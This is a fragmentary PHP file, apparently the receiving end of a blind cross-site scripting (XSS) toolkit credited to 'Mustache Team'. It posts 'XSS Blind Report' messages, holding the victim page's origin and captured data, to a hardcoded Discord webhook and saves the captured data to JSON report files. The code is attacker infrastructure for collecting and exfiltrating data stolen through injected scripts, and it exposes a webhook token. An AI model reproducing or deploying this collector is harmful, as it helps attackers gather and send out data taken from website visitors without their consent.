...
$webhookUrl = "https://discord.com/api/webhooks/1105210014009921708/cM2nlNDxRUyZ3el2LoJnohSMR999d36jz_g9tk3yMzAiZQOive9hwc1tR1g7gTEw0F8b";
...
function send_message_to_discord($data, $WebhookUrl)
{
    ...
    $payload = json_encode([
        ...
        'embeds' => [
            0 => [
                'title' => 'XSS Blind Report for ' . $data['hs'],
                'url' => $data['origin'],
                'color' => 0,
                'fields' =>
                    [
...
' . $data['fn'].'.json' . ' ```',
                ...
                'footer' =>
                    [
                        'text' => 'Created By Mustache Team',
                        'icon_url' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
                    ]
            ],
        ],
        'username' => 'Blind Xss',
        'avatar_url' => 'https://cdn.discordapp.com/avatars/1105185269948370994/1cedb38a2a42f2fa84aef80637ddf982.webp?size=512',
        'attachments' => [],
    ]);
...
function create_content($data)
{
    return json_encode([
        ...
        'content' => $data['fd'],
        'Created By Mustache Team' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
    ]);
}

function create_file($content, $file_name)
{
    $file_path = __DIR__ . '/report/' . $file_name . '.json';
